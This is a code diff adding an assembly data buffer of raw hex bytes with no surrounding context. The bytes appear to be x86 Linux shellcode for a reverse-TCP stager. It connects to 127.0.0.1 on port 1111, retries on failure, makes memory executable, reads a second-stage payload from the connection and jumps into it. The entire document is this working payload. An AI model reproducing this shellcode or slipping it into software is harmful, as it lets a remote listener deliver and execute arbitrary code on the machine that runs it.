@@ -1,0 +1,10 @@
+buf DB 6ah,0ah,5eh,31h,dbh,f7h,e3h,53h,43h,53h,6ah,02h,b0h
+    DB 66h,89h,e1h,cdh,80h,97h,5bh,68h,7fh,00h,00h,01h,68h
+    DB 02h,00h,04h,57h,89h,e1h,6ah,66h,58h,50h,51h,57h,89h
+    DB e1h,43h,cdh,80h,85h,c0h,79h,19h,4eh,74h,3dh,68h,a2h
+    DB 00h,00h,00h,58h,6ah,00h,6ah,05h,89h,e3h,31h,c9h,cdh
+    DB 80h,85h,c0h,79h,bdh,ebh,27h,b2h,07h,b9h,00h,10h,00h
+    DB 00h,89h,e3h,c1h,ebh,0ch,c1h,e3h,0ch,b0h,7dh,cdh,80h
+    DB 85h,c0h,78h,10h,5bh,89h,e1h,99h,b2h,6ah,b0h,03h,cdh
+    DB 80h,85h,c0h,78h,02h,ffh,e1h,b8h,01h,00h,00h,00h,bbh
+    DB 01h,00h,00h,00h,cdh,80h
